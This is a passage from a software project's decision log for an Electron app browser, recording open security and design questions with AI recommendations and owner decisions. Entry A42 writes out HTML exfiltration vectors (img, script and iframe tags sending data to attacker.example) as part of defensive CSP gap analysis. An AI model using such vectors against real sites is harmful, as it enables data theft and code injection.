**Why this is written down rather than just done.** The PR that surfaces this (labelled
`needs-owner-decision`) is a fait accompli either way — the code is written, tested and
verified, and re-splitting it now costs real time for uncertain benefit. What is genuinely open
is whether this is treated as a one-time, named exception or whether the rule itself should grow
a carve-out for the next sweep.

### A27 — `*.` means two different things depending which file reads it **[AI-REC]**

Pre-existing on `main`. Found from three independent angles during the broker/loader review
pass (2026-09-01) — an altitude read of `update.ts` against `connect-patterns.ts`, and a
cross-file check run twice more from different starting points — all converging on the same
file pair.

`src/broker/policy/update.ts`'s `hostCovers` treats a leading `*.` as a **real** suffix
wildcard for the app-update re-consent check — `*.example.com` genuinely matches
`api.example.com`, with a documented registry-boundary argument for why that is safe there.
`src/broker/policy/connect-patterns.ts` treats the identical syntax as matching **nothing**, and
says so directly in its own comment: *"No sub-glob support: `*.example.com` matches nothing
rather than being approximated."*

**Concrete failing scenario.** A developer writes a manifest with
`connect: ["*.api.example.com:443"]`, modelling it on the wildcard syntax `update.ts` treats as
real. `parseManifest` accepts it, the grant prompt renders it, and the user approves it — and the
capability then authorises nothing, because `connect-patterns.ts` denies every host that pattern
could name. Verified directly: `parseManifest('*.example.com:443')` succeeds, and
`connect-patterns.ts` has no host that pattern allows.

The failure direction is safe — an app that trips this is over-refused, never under-refused —
so this is a trap rather than a hole, the same distinction `canonical-host.ts` already draws for
its own wildcard case.

**AI recommendation:** decide what `*.` means, once, and make both files agree. The safer
reading is "no sub-globs" — the one `connect-patterns.ts` already argues for — in which case
`hostCovers`'s wildcard branch is the one that should narrow, to exact match plus a bare `*`.

**Needed by:** before the grant prompt is built (build step 4), the first point a user sees a
pattern that means two different things depending which file is asked.

### A28 — path confinement's synchronous `realpath` blocks the broker on every confined `fs` call **[AI-REC]**

Pre-existing on `main` (`src/broker/policy/paths.ts`'s `realpath` parameter is declared
synchronous). Found during a review pass over the broker's efficiency, corroborated
independently by an altitude pass and a line-scan pass over the same file.

`confinePath`'s algorithm can walk several blocking `stat`/`lstat` syscalls per call, and its
`realpath` parameter is declared **synchronous**. Any broker that uses it therefore performs
blocking syscalls on the main thread inside functions (`readFile`/`writeFile`) that are
otherwise async.

**Concrete failing scenario.** One origin whose confinement root sits on a slow or
network-backed filesystem hard-blocks — not merely queues — every other origin's pending `net`
and `fs` calls. That is `security-model.md`'s named threat T11b (*"a loop of
`orivon.fs.stat()` hangs the whole browser"*), reached by a mechanism the in-flight cap cannot
bound: the cap limits the *number* of concurrent operations, not the cost of any one of them.

**AI recommendation:** give `confinePath` an async `realpath` parameter
(`(p: string) => Promise<string>`) and make `confinePath` itself async, so callers can `await
fs.promises.realpath`. Not a fix to make in passing — `policy/paths.ts` sits outside the paths
this defect was found from, and reaching into it from an unrelated stream is exactly the kind of
cross-stream edit `parallel-work.md` asks to be raised rather than made.

**Needed by, re-dated 2026-09-01 (owner's decision, filed alongside A35):** the original trigger
— "before `orivon.fs` is wired to a renderer" — turns out to have been a proxy for the real one,
and it fired one step early. `confinePath` has exactly one caller in the whole tree
(`confineForOrigin`, `src/broker/index.ts:303`), and that call sits **behind** a grant check
(`:300`: `if (grant === undefined) throw fail('denied', ...)`). Nothing anywhere calls
`broker.grant()` yet, so every `orivon.fs` call today is refused before `confinePath` ever runs
— the blocking `realpath` this entry describes is real but currently **unreachable**.
`orivon.fs.readFile`/`writeFile` were wired to a renderer in `src/broker/ipc.ts` (build step 2's
IPC task) on this date regardless, a decision the owner made explicitly rather than blocking on
this fix, since it changes nothing reachable yet. The AI recommendation above is unchanged —
this only corrects when it actually starts to matter: **before any origin holds a real `fs`
grant**, i.e. before the permission-prompt work lands.

### A29 — `quotaBytes`'s startup-reconciliation promise has no owner **[AI-REC]**

Pre-existing on `main` (`src/contracts/manifest.ts:102-111`). Found during a broker review
pass's check for behaviour the contract promises but nothing implements, corroborated twice.

`src/contracts/manifest.ts:102-111` documents the quota contract as maintaining *"a running
per-origin byte counter, checks it on write, and yields `'limit'` when exceeded, reconciling
against the directory on startup rather than walking the tree on every operation."* The
in-memory counter and on-write check exist, closing the unbounded-write hole this contract is
written to prevent. **The startup-reconciliation half does not:** it needs a persisted counter
and a way to size the confinement directory, and nothing currently owns either.

**Concrete failing scenario.** An app writes up to its quota, the user quits, and reopens the
app. Because the counter is in-memory only, it resets to zero on restart — the quota bounds a
session, not the disk, and the app can keep writing past its declared limit simply by
restarting.

**AI recommendation:** decide whether the counter is persisted by the broker (a new `BrokerFs`
member plus a startup hook) or by the storage layer build step 4 introduces, and record the
choice. `src/contracts/` itself should not change to soften the promise — the gap is in the
implementation, not the contract.

**Needed by:** before packaging (build step 10), which is when a real user's disk is at stake.

### A30 — `CLAUDE.md`'s `BaseWindow` titleBar claim is false against electron 44 **[AI-REC]**

Pre-existing on `main`. Found while reviewing a PR that was about to copy the same claim into
the `orivon-electron` project skill; verified independently against
`node_modules/electron/electron.d.ts` at electron 44.0.0 and against context7's live docs.

`CLAUDE.md` §Start here says Electron's `.d.ts` *"sometimes types an option/event on
`BrowserWindow` only, even when it works identically on `BaseWindow`"*, and names four
examples: `ready-to-show` and the `titleBarStyle`/`titleBarOverlay`/`trafficLightPosition`
family. **Only the first is true.** `ready-to-show` is genuinely declared on `BrowserWindow`
alone (`electron.d.ts:4704-4708`). The other three are declared directly on
`BaseWindowConstructorOptions` (`titleBarOverlay` at `:4039`, `titleBarStyle` at `:4043`,
`trafficLightPosition` at `:4049`), and `setTitleBarOverlay(...)` is a method on the
`BaseWindow` class itself (`:3569`).

**Concrete failing scenario.** `CLAUDE.md` is the first file every agent working here reads. An
agent that trusts this sentence will distrust the `.d.ts` for the titleBar family in a case
where the `.d.ts` is right — either chasing external verification it does not need, or avoiding
options that already work on `BaseWindow`, on the strength of a claim this repository made about
its own dependency.

**AI recommendation:** correct the sentence to keep only the `ready-to-show` example of the
`.d.ts` gap, and either drop the titleBar family from it or state separately that those three
are confirmed present on `BaseWindow`. The primary fix route is `/revise-claude-md`, which
`CLAUDE.md`'s own tooling table already assigns this job to — this entry is the durable record
in case that pass does not run before the claim is copied somewhere else.

**Needed by:** the next document or skill that would otherwise repeat the claim.

### A31 — extending the docs-borrow carve-out beyond `backlog-NN` branches **[AI-REC]**

A process question, extending A24's theme. Raised while reviewing a stream branch that changed
a function signature already documented in two `docs`-owned files.

`parallel-work.md`'s ownership map gives `docs/` to the `docs` stream, and its borrow mechanism
— letting a branch touch a path it does not own when leaving it stale would be worse — is
written for `backlog-NN` branches only. A stream branch changing `checkConnect`'s signature
needed to edit `docs/development/testing.md` and `docs/planning/build-plan.md`, because both
document that exact signature and both already carried two prior "Corrected" notes for the same
line. Leaving them stale after a third change would have been the worse outcome the borrow
mechanism exists to avoid.

**AI recommendation:** extend the borrow carve-out from `backlog-NN` branches to any branch
editing a document that specifies an interface the branch itself owns and is changing, on the
same terms — name it in the PR body. Same shape as A24's proposed carve-out for repo-wide
sweeps, and this is the second time the ownership map has needed one.

**Needed by:** before the next signature change lands. Not blocking anything today.

### A14 addendum — an argument against the trailing-dot merge, recorded after the decision

A14 (resolved by the owner 2026-08-26) strips the trailing DNS root label, so `https://x.example.`
and `https://x.example` are one origin. **The decision stands, re-confirmed by the owner on
2026-08-27.** This records an argument that surfaced during review afterwards, so that a future
reader does not mistake it for something nobody considered.

The reasoning behind A14 was that both spellings are the same DNS name, served by the same
operator under the same certificate. The first half is always true; **the second is not
guaranteed.** Browsers send `Host: x.example.` verbatim, and virtual-host matching is an exact
string comparison — nginx's `server_name x.example;` does not match it. On a host configured
that way the request falls through to the **default vhost**, which may serve different content
under a different operator's control. Merged origins mean that content inherits the app's
grants, storage domain and identity key.

**Why the decision was kept anyway:** exploiting it also requires a certificate valid for the
trailing-dot name, browsers generally strip the dot before certificate matching, and the
alternative costs a real user-visible failure — one mistyped character silently produces a
second, empty copy of the app that has to be re-granted everything. `ADR-0003` makes this
unfixable after the first grant is persisted, so it is recorded here rather than left implicit.

---

### A32 — should the new inert toolbar icons ship before they do anything **[AI-REC]**

Found while planning the chrome restyle (2026-08-28). The owner asked for a full visual match
to a reference screenshot, including icons for features that don't exist yet in this repository
and, in one case (a wallet-shaped glyph), a feature that is a stated MVP non-goal
(`mvp-scope.md` §Explicit non-goals — "Not a wallet"). The glyph is relabelled `identity` rather
than `wallet` in code and in its tooltip, since Nostr identity *is* in scope and the shape is
generic; nothing about the icon itself implies funds.

**Recommendation [AI-REC]:** every inert icon ships `disabled`, with a `title` naming what it
is and stating plainly that it is not in v0 (`"Extensions — not in v0"`), rather than either
omitting it (breaking the visual match the owner asked for) or drawing it silently clickable
(which answers a click with nothing, which is worse than an honest disabled state). Revisit
at this build step's readability check — if a newcomer reads the toolbar as promising features
that don't exist, that is exactly the class of finding that check is for.

**Needed by:** before the chrome-restyle PR opens.

---

### A33 — should the bookmarks bar hide itself when empty **[STILL OPEN]**

Found while planning the chrome restyle (2026-08-28). Chrome only shows its bookmarks bar on
the new-tab page by default; everywhere else, and for a user with zero bookmarks, it stays
hidden. This shell's v0 always shows the row, which is simpler to implement and reason about
but spends 28px of vertical space on an empty row for a fresh profile's very first launch.

Not decided either way. v0 ships with it always visible; whether to hide it when the bookmark
list is empty is left for whoever next touches `src/renderer/bookmarks-view.ts`.

**Needed by:** not blocking anything.

---

### A34 — the tab strip's native-controls inset is an unmeasured approximation **[RESEARCH]**

Found while implementing the chrome restyle (2026-08-28). Merging the tab strip into the
window's title row means the tab strip must leave room for Electron's native window buttons
(`titleBarOverlay` on Windows/Linux; the macOS traffic lights). The documented way to learn
their exact geometry is `env(titlebar-area-x/y/width/height)` in CSS, or
`navigator.windowControlsOverlay.getTitlebarAreaRect()` in JS — but **every example in
Electron's own docs and test fixtures constructs a `BrowserWindow`**, and this shell is a
`BaseWindow` holding `WebContentsView`s, which has no single "main" webContents for the
Window Controls Overlay feature to attach to.

A throwaway probe app (`BaseWindow` + `titleBarOverlay` + a `WebContentsView` reading both
APIs from inside the page) confirmed empirically, rather than assumed: `env(titlebar-area-*)`
resolves to `0px` for every axis, and `navigator.windowControlsOverlay.visible` is `false` with
an all-zero rect. Neither API is populated for this window shape, on this Electron version
(44.0.0).

**Consequence:** the restyle reserves a fixed inset instead of a measured one — 138px on the
right for Windows/Linux (three native caption buttons at Windows 11's own 46px width, the same
figure the prior prototype hardcoded for its own custom buttons) and 78px on the left for
macOS (the `trafficLightPosition` offset plus the traffic-light cluster's width). If the real
native control area is ever narrower or wider than these numbers on some platform or desktop
environment, the result is a cosmetic gap or a very slightly crowded tab, not a functional
break — no interactive element ends up under a native button, because 138px and 78px are
deliberately generous.

**Needed by:** revisit if a future Electron version wires Window Controls Overlay geometry
through `BaseWindow`, or once real hardware on all three platforms has actually confirmed the
approximation holds. Nobody has verified this outside Linux/X11, where the probe above ran.

### A35 — `ResponseEnvelope` has no `handleId`, though `OrivonError` declares one **[AI-REC]**

Found while wiring `src/broker/ipc.ts`'s control channel (build step 2's IPC task, 2026-09-01).

`contracts/errors.ts`'s `OrivonError` declares an optional `handleId`, and `src/broker/
handle-store.ts` populates it — a `'closed'` error is meant to be able to say *which* handle
closed. `contracts/ipc.ts`'s `ResponseEnvelope`'s failure branch carries `code`, `platformCode`
and `message`, but not `handleId`. Any control method that throws `'closed'` loses that field
the instant it crosses `ipcMain.handle`/`ipcRenderer.invoke`, silently — nothing here rejects a
response for omitting a field its own type never declared.

Not reachable today: none of the four control methods `ipc.ts` wires (`app.manifest`,
`app.grants`, `fs.readFile`, `fs.writeFile`) can throw `'closed'`. It becomes reachable the
moment a wired method can reference a live handle — the byte-pump task's `net.connect`/
`net.close`, most obviously.

**AI recommendation:** add `handleId?: string` to `ResponseEnvelope`'s failure branch, mirroring
`OrivonError` exactly. A `contracts/` change — its own PR, merges first, per `CLAUDE.md`
§Parallel work and this file's own convention for contracts gaps.

**Needed by:** before any control method that can throw `'closed'` is wired — likely the
byte-pump task.

### A36 — `build-plan.md` schedules grant prompts a build step earlier than `A20`/`A27` do **[STILL OPEN]**

Found while wiring `src/broker/ipc.ts`'s control channel (build step 2's IPC task, 2026-09-01),
while checking whether this PR was expected to include a grant-prompt driver.

`build-plan.md`'s own `## Sequence` section lists *"grant prompts"* as part of step 2, alongside
manifest parsing, the grant model, per-origin enforcement and session partitions. But `A20`'s
and `A27`'s "Needed by" columns both say, independently and using the same words, *"before the
grant prompt is built (build step 4)"* — and both reasons are substantive: `A27` is about a
pattern-matching disagreement a user would see spelled two ways at the prompt, and `A20` is
about a canonicalisation helper the prompt has not adopted yet. Neither entry could have been
written against a step-2 prompt, since step 4 (the app loader) is what produces the manifest a
prompt has anything to show.

**This is not resolved by ignoring `build-plan.md`'s wording**, since the wording is itself an
open contradiction, not obviously a typo — `build-plan.md`'s step-2 sequence text may predate
`A20`/`A27`, or the step-4 dependency may itself be a later-discovered constraint that should
have moved the line in `build-plan.md` and did not.

**Not resolved in this PR.** `src/broker/ipc.ts` wires no grant-prompt driver and no
`app.requestGrant` method — deliberately, per its own file header and this PR's "Deliberately
not done".

**Needed by:** before the grant prompt is scheduled into a specific build step's PR list — the
owner should say which document is wrong.

### A37 — the byte pump's write direction has no wire protocol anywhere **[STILL OPEN]**

Found while implementing the byte pump's broker side (build step 2, 2026-09-01) — specifically
while designing `src/broker/port-pump.ts`, which relays the READ direction only.

`contracts/ipc.ts` specifies exactly three messages for a socket's dedicated
`MessageChannelMain` port: `DataMessage` (broker -> renderer, bytes arriving), `CreditMessage`
(renderer -> broker, bytes consumed) and `StreamEndMessage` (broker -> renderer, once, at a
terminal state). All three exist to make the READ side's credit window work, and
`handle-contracts.md`'s "Backpressure — a credit window" section — the one place this whole
mechanism is specified in detail — describes the read side exhaustively and the write side in
exactly one sentence, an outcome rather than a protocol: *"`writable`'s `write()` resolves only
once the broker has accepted the bytes into the OS socket send buffer, so an app that `await`s
each write receives genuine write-side backpressure too."* Checked, not assumed:
`capability-api.md`'s Throughput section and `ADR-0008` were both re-read looking for a
write-side message shape; neither adds one beyond restating that same sentence.

**Concretely missing:** how the renderer sends outbound bytes to the broker over the port (does
it reuse `DataMessage`'s shape in the opposite direction, since the type carries no direction
field? a distinct `WriteMessage`?), and how the broker signals "accepted into the OS socket send
buffer" back to the renderer so its `writable.write()` promise resolves at the right moment (no
message type exists for this at all — not even an outcome-only one like `StreamEndMessage`).

**Not resolved in this PR**, on purpose, after discussion with the owner: `src/broker/port-
pump.ts` implements the read direction only and says so in its own header, rather than
inventing a write protocol from inside a `broker`-owned PR. Any wire message this needs is a
`src/contracts/` change, which `parallel-work.md` and this file's own convention both require to
merge first, alone, in its own PR — not decided implicitly by whichever stream happens to write
the preload-side pump.

**AI recommendation, for whoever writes that contracts PR:** the simplest consistent extension
is a `WriteMessage { kind: 'write', handleId, chunk }` (renderer -> broker, mirroring
`DataMessage`'s shape exactly) plus a `WriteAckMessage { kind: 'write-ack', handleId, bytesWritten
}` (broker -> renderer, sent once the OS socket's write callback fires) that the renderer's
`WritableStream`'s `write()` implementation awaits before resolving. Not implemented or vetted
against real backpressure behaviour — a recommendation to start from, not a decision.

**Needed by:** before the preload-side byte-pump PR (readable/writable WHATWG streams built over
the port in the isolated world) can implement `writable` at all.


### A38 — no per-origin rate limit on IPC dispatch, only a concurrency cap **[RESOLVED]**

Found re-checking the control channel while fixing an unrelated defect in the byte-pump PRs
(build step 2, 2026-09-02) — specifically while confirming what actually bounds
`app.manifest`/`app.grants`, the two wired methods with no I/O of their own.

`security-model.md`'s T11b entry names the mitigation as two things together: "Per-origin
in-flight cap + token-bucket rate limit on IPC dispatch; all `fs` work genuinely async." The
first half is real and tested — `HandleTable`'s `inFlight` counter (`handles.ts`), enforced via
`handleTable.run`, rejects immediately rather than queueing once `LIMITS.inFlightOperations` is
hit (`contracts/limits.ts`). The second half — a rate limit, bounding how often an origin may
call in a given span of time, independent of how many calls are outstanding at once — does not
exist anywhere in the tree. `grep`ping for "token", "bucket" or "rate.?limit" under `src/`
returns nothing resembling one.

This matters specifically for `app.manifest` and `app.grants`: neither calls `handleTable.run`
(there is no handle, no grant, and no I/O to scope), so the in-flight cap never engages for
them — each call resolves before the next one could push the count up. Confirmed empirically,
not assumed: 5,000 concurrent `orivon.app.grants()` calls from a single origin, fired through
`handleControlRequest` directly, were answered in full — zero rejected with `'limit'`. Every one
of those calls still runs a dispatch through the broker on the Electron **UI thread** (the same
thread every tab's compositor and input handling shares), so a loop of these from one origin is
T11b by a route the in-flight cap was never built to cover: a freeze of every open tab, not a
resource leak.

**Not fixed in the branch that found it, on purpose.** A rate limit needs real decisions this
document exists to surface rather than guess at: how many calls per second is the bound, whether
it is shared across all six methods or set per method, whether it decays linearly or in discrete
buckets, and whether `fs`/`net` calls — already capped by the in-flight limit — should also count
against it. None of `contracts/`, `handle-contracts.md` or `capability-api.md` specifies any of
this; inventing a set of numbers from inside a fix branch would be exactly the kind of
undocumented, silently-decided architecture Rule 1 exists to prevent.

**AI recommendation, for whoever designs it:** the shape T11b's own wording already implies
(a token bucket: a per-origin budget that refills at a fixed rate and is spent per call,
rejecting once empty rather than queueing, mirroring the in-flight cap's own "reject
immediately" rule) is a reasonable starting point. Where it would live (a new field on
`LIMITS`, a new small module analogous to `port-registry.ts`, and where in `handleControlRequest`
/`dispatch` it would be checked) is not decided here.

**Needed by:** before any app can call `orivon.app.manifest`/`orivon.app.grants` in a loop with
no user action gating it — realistically, whichever build step first ships an app that polls its
own grants (a plausible pattern for anything that wants to react to a revocation live).

### Resolution, 2026-09-02

A shared per-origin token bucket (`src/broker/token-bucket.ts`), checked in
`handleControlRequest` before `dispatch()` runs, gates **all six** control methods uniformly —
never queueing, mirroring the in-flight cap's own "reject immediately" rule. Answers the three
open questions above:

- **Shared across all six methods, not per-method.** Simpler, and automatically covers any
  future seventh method with no more code. `fs`/`net` are already separately bounded by the
  in-flight cap; this is an *additional*, independent bound on call *frequency*.
- **Continuous linear refill, not discrete windows.** Avoids the classic double-burst-at-a-
  boundary failure mode (max out the tail of one window, then immediately max out the head of
  the next).
- **`fs`/`net` calls count against the same shared bucket.** No special-casing.

**The numbers — capacity 200, refill 100/sec per origin — are an AI recommendation, not an
owner decision**, and are stated as such directly beside them in `src/broker/ipc.ts`. No
measured `CONTROL_CHANNEL` dispatch-rate data exists anywhere in the corpus (spike gate 4
measured socket *byte* throughput over the dedicated port, never this channel's call
frequency), so they are sized against the demonstrated attack (5,000 concurrent calls, now cut
to ~200 admitted) and the realistic legitimate case (an app polling `app.grants()` — two orders
of magnitude of headroom below this budget), not against any real `fs`/`net` traffic pattern,
since none has been exercised yet.

**A `net.close` exemption was considered and rejected.** The idea (cleanup paths shouldn't be
blocked by the limit they'd relieve, mirroring `HandleTable.release` never being gated by the
in-flight cap) does not transfer: `net.close` needs no grant at all, so exempting it would
reopen the exact vulnerability this entry describes through a different, permanently-open
method. Releasing 512 sockets at 100/sec costs ~5 seconds — a trivial price next to leaving a
method with no bound.

**New, unresolved risk, named rather than solved:** once `fs`/`net` dispatch sees real traffic
(build step 3+), a legitimate burst of small file reads or socket connects could consume most of
an origin's shared budget and cause an *unrelated* `app.grants()` poll to be denied `'limit'`,
even though that poll alone was well within any sane rate. Revisit once real webtorrent I/O
drives this path end-to-end — either a second, separate bucket for I/O-bound methods, or a
documented decision that the trade-off is acceptable.

### A39 — `index.ts` keeps a private, stricter `isOrivonError` than `errors.ts`'s **[AI-REC]**

Found 2026-09-02 while consolidating a third duplicate in the same file pair (`errnoOf`, now in
`errors.ts` and imported by both call sites).

[`errors.ts`](../src/broker/errors.ts)'s `isOrivonErrorLike` requires `instanceof Error` plus a
`code` in the enum. [`index.ts`](../src/broker/index.ts)'s private `isOrivonError` requires all
of that **and** `.name === 'OrivonError'`. They therefore disagree about one real case: an error
an adapter constructed with a valid `code` but a different `name` is broker-produced to
`errors.ts` and raw-from-a-dependency to `index.ts`. `index.ts` also keeps its own copy of the
11-value `ORIVON_ERROR_CODES` set that `errors.ts` already exports.

`errors.ts`'s own doc comment has flagged this since it was written — deliberately deferred
under "fixed where touched, not chased", not missed. It is recorded here because that note
lived only in a code comment, where nothing tracks it, and because the `errnoOf` duplicate that
prompted this entry shows the pattern reproducing in the same two files.

**AI recommendation:** export `ORIVON_ERROR_CODES` from `errors.ts`, then decide which name
check is correct rather than merging them blind — `.name` is set by `BrokerError`'s constructor,
so the stricter test is the one that actually means "this broker built it", and the looser one
may be the defect. That is a behavioural decision, which is why this was not folded into the
`errnoOf` change.

**Needed by:** before anything else starts classifying thrown values. Not blocking.

### A40 — Rule 1 has a mechanically checkable failure mode, and enforcement is deferred **[AI-REC]**

Found 2026-09-02, auditing the five byte-pump commits against `code-guidelines.md`.

Three comments narrated the change rather than the code — two "a sibling commit ...", one
"`HandleTable.fail` already existed ... nothing had ever wired a caller up to it". They passed
Rule 1's stated test (none restates the line beneath it) and the files' comment density was in
line with `derive.ts`'s 67%, which a prior audit reviewed and accepted. They fail the rule's
*purpose*: after merge, "the sibling commit" names nothing a reader can resolve.

**This is not new drift, which is the more useful finding, and the first count of it was wrong.**
Widening the search from "sibling commit" to "this PR"/"this task"/"the PR body" turns up
**nineteen** instances across four streams (`broker/`, `loader/`, `preload/`, `shim/`) and many
separate commits. The dominant idiom is "see the PR body" — five instances, each pointing a
future reader at a document that is not reachable from the tree, and one of them at "this PR's
body under 'Decisions and open questions'" specifically. A second family ("OUT OF SCOPE for this
task", "files this task may not touch") encodes a *branch-local constraint* as if it were a
property of the code, and becomes false the moment the constraint lifts — `grant-ledger.ts`'s
had already gone stale that way.

So the five commits that prompted this entry did not introduce the habit; they inherited it.
Eight are fixed here (the three above, plus four in `broker/` and `errors.ts`'s own). Eleven
remain, seven of them in `broker/` and four in paths this stream does not own.

**Not swept in one pass, deliberately.** A nineteen-comment rewrite spanning four streams is
exactly the cross-stream edit `parallel-work.md` says to raise rather than make, and the repo's
own "fixed where touched, not chased" principle applies. The hook below warns on edit, so the
remainder get fixed as their files are next opened.

Two things follow, and they pull in opposite directions:

- Rule 1's worked example only covers restating-the-code, so an audit applying the rule as
  written passes this class. The rule's §Where a long comment is right could name it: **a
  comment describes the code as it stands, not the change that produced it.** Git history holds
  the change.
- Unlike the rest of Rule 1, this specific class *is* greppable — it has a lexical signature
  ("sibling commit", "this PR", "already existed", "previously"). §Open points 2 records the
  owner's decision that nothing enforces these rules mechanically, **rules first, enforcement
  later**, so adding a `check:comments` guard would reverse a standing decision and is not done
  here.

**AI recommendation:** add the sentence to Rule 1 now (documentation, not enforcement, so it
does not touch Open point 2), and add a `hookify` warn-only rule, which `CLAUDE.md` already
sanctions as the mechanism for "whenever the owner corrects the same thing twice" and which is
advisory rather than a build gate. Hold `check:comments` until Open point 2 is revisited.

**Needed by:** whenever the next batch of commits is written by an agent. Not blocking.

### A41 — WebRTC blocking has no mechanism specified anywhere **[RESEARCH]**

Found 2026-09-02 writing T22's CSP `connect-src` derivation
(`src/broker/policy/connect-src.ts`). ADR-0006 requires that an app without a network capability
be unable to reach the network at all, and WebRTC is a hole in that: a plain `RTCPeerConnection`
can open a data channel or hit a STUN/TURN server without ever calling `orivon.net.connect`, and
without going through `fetch`/`WebSocket` either — so nothing this build step touches bounds it.

No mechanism is specified anywhere in the corpus. There is no `webrtc-src` in real CSP (the
directive does not exist); nothing in this tree or the vision corpus references
`setPermissionRequestHandler` or a Blink feature-disabling precedent for it.

**This is not purely a missing-mechanism problem.** The flagship's own spike evidence
(`week-0-spike-plan.md`) deliberately leaves WebRTC unaliased so webtorrent uses Chromium's
native implementation — blocking WebRTC outright for a capability-less app would also break the
flagship's own use of it, unless blocking is scoped to "no network capability granted" in a way
nothing here yet defines. "Block WebRTC" has an unrecorded product cost, not just an unbuilt
mechanism.

**Needed by:** build step 6, before the trust indicator's C-ladder claims are shown to a user —
a claim of "no network access" is false today for any app that tries WebRTC. Not blocking this
PR.

### A42 — what the injected CSP does not bound **[STILL OPEN]**

Found 2026-09-02, same file as A41. Stated in `connect-src.ts`'s own header, recorded here so it
is reachable outside a code comment (A40's own lesson).

T22's `connect-src` bounds `fetch` and WebSocket only. `img-src`, `form-action`, navigation
(`<a href>`, `location.href`), and `<link rel=prefetch>` are separate CSP directives this PR does
not set, and an app can use any of them to exfiltrate data to a host `orivon.net.connect` would
have refused — an `<img src="http://attacker.example/?d=...">` needs no capability at all under
today's policy. ADR-0006's "the manifest genuinely bounds network reach" overstates this for
anything beyond `fetch`/WebSocket.

**Two more channels, found on review 2026-09-02, worse than the ones above.** `script-src` is
also unset: `<script src="https://attacker.example/?d=...">` both exfiltrates AND executes
arbitrary code at the app's own origin — data theft and code execution from one unset directive.
`frame-src` is unset too: an app can embed `<iframe src="https://attacker.example/relay.html">`,
whose own `'self'` is the attacker's origin (not the app's), and `postMessage` data into it —
CSP on the app's document has no say over what the framed origin does with what it receives.

Separately, and more fundamentally: CSP bounds **names**, `checkConnect` bounds **resolved
addresses**. For a hostname pattern the two diverge exactly on DNS rebinding (T12) — a name CSP
grants reach to can still resolve privately, reachable by `fetch` though not by
`orivon.net.connect`. No CSP construction closes that; it is Chromium's Private Network Access
problem, not this function's.

**Needed by:** before the trust indicator (build step 6) or `security-model.md` state either gap
as closed. Not blocking this PR — recorded so the honest scope of T22 survives past the file
header that currently carries it alone.

### A43 — a grant CSP cannot represent is omitted, which means BLOCKED, not merely uncovered **[OWNER DECISION]**

Found on review 2026-09-02, same file as A41/A42. CSP's `connect-src` allowlist has no way to
express "any public unicast address" (what a bare `*` pattern means, `security-model.md` T12) or
a port range wider than `connect-src.ts`'s `MAX_ENUMERATED_PORTS` (16) — CSP has no range syntax,
only an enumerable source list. `connectSrcFor` omits both rather than approximating them.

**The consequence is larger than the file's own framing first suggested.** The emitted
`connect-src` value is the app's ENTIRE allowlist for ordinary `fetch`/WebSocket calls — an
omitted pattern is not "uncovered by CSP", it is unreachable. The flagship torrent app genuinely
holds `tcp.connect: ["*:*"]` (`capability-api.md`), which has no CSP equivalent at all. Once
build step 4 wires `onHeadersReceived`, that app's `connect-src` becomes `'self'` and nothing
else — every ordinary `fetch`/WebSocket call the app's own page might make (an update check, a
tracker announce over HTTP rather than the broker) fails, even though the broker itself would
allow it via `orivon.net.connect`. The torrent transfers themselves are unaffected — those go
through the broker, not through page-level `fetch`.

**Owner decision, 2026-09-02: keep the lock shut tight.** Three options were on the table —
(1) keep omitting, accept the app-side breakage as the cost of never widening CSP past what the
user actually granted; (2) translate `*` to CSP's bare `*`, which works but also opens the app's
page to the user's own loopback and LAN, exactly what a `*` grant explicitly excludes
(`connect-patterns.ts`'s own `hostMatches`); (3) have `connectSrcFor` signal "this grant cannot
be bounded by CSP" and have build step 4 skip setting the header for that origin entirely, which
is reach-equivalent to (2) but never states a false claim in the header itself. The owner chose
(1): CSP stays as strict as it can honestly be, `omitted` reports every unrepresentable pattern
with an accurate reason (`host-any-public-unicast`, `port-range-too-wide`) so a later trust
screen can explain a broken feature instead of leaving it silent, and no widening path is left
for a future change to take by accident.

**Needed by:** build step 4 (the header actually gets applied) and build step 6 (the trust
screen needs `ConnectSrcPolicy.omitted` to explain the breakage). Not blocking this PR — the
derivation is correct as specified; this records the decision and its cost for whoever wires it.

### A44 — secp256k1 point derivation and BIP-340 Schnorr signing exist nowhere, and two sources disagree on which layer should build them **[RESEARCH]**

Found 2026-09-03, building `src/nostr/`'s `window.nostr` (NIP-07) surface (build step 7,
`nostr-01-nip07`).

Confirmed, not assumed: `grep -rln "secp256k1" --include="*.ts" src/` finds the string only in
`derive.ts`/`derive-p256.ts` (as a `DeriveCurve` member and an explicit rejection) and in this
lane's own `nip07.ts` (a comment). No file anywhere in the tree performs secp256k1 scalar
multiplication or produces a BIP-340 Schnorr signature. `derive-p256.ts`'s own `derivePublicKey`
throws `'internal'` for any curve other than `'P-256'`, with the message *"no public-key
derivation for `${curve}` in the policy layer; derive the point from `derivePrivateScalar()` one
layer up (`src/nostr/`)"*.

**Two sources disagree about where the fix belongs.** This lane's brief says the gap "belongs
under `src/broker/policy/`, and not something to hand-roll under time pressure" — consistent with
where P-256's point derivation already lives. But `derive-p256.ts`'s own doc comment (owner
decision, 2026-08-27, citing `ADR-0010 §Rejected`) says the opposite: WebCrypto cannot do
secp256k1 point multiplication or BIP-340 Schnorr signing at all, so once a pure-JS curve library
is needed for the signature, deriving the point with that same library costs nothing extra — and
names `src/nostr/` by path as where that should happen.

**Taken literally, that would require `src/nostr/` to call `derivePrivateScalar()`** — exported
from `derive.ts` — **directly, which conflicts with `src/nostr/README.md`'s own boundary** ("What
it must never import: `src/broker/` internals"), a rule this lane was explicitly told to hold
(brief's Out-of-bounds section). It would also mean the raw derived PRIVATE SCALAR leaving the
broker for wherever `src/nostr/`'s code actually executes (preload or renderer-adjacent, since it
constructs `window.nostr` for an untrusted page) — which reads as a direct conflict with
`capability-api.ts`'s own rule that "the seed is never exposed and raw key export is not a
capability at any tier." Not resolved here: it needs the owner, or whoever wrote
`derive-p256.ts`'s comment, to say what "one layer up (`src/nostr/`)" actually meant — a new
broker-internal module conceptually adjacent to Nostr, or literally this directory.

**What the interface needs to look like, so whichever lane builds this does not have to redesign
`src/nostr/`'s side:** `nip07.ts` exports `NostrSigner = (event: UnsignedNostrEvent, hint:
SignPrompt) => Promise<SignedNostrEvent>` and `orivonIdentitySigner(orivon): NostrSigner`, the
latter forwarding straight to `IdentityHandle.signEvent(event)` (after `orivon.id.requestIdentity(
{ kind: 'nostr' })`). Whatever implements the real signature only needs to make
`IdentityHandle.signEvent` — already in `src/contracts/handles.ts`, unchanged by this lane —
actually: (1) independently recompute the NIP-01 id from the event's own fields rather than trust
anything the caller supplies (`nip01.ts`'s `computeEventId` is a tested, frozen-vector reference
implementation of exactly that serialization, safe to port or diff against); (2) derive the
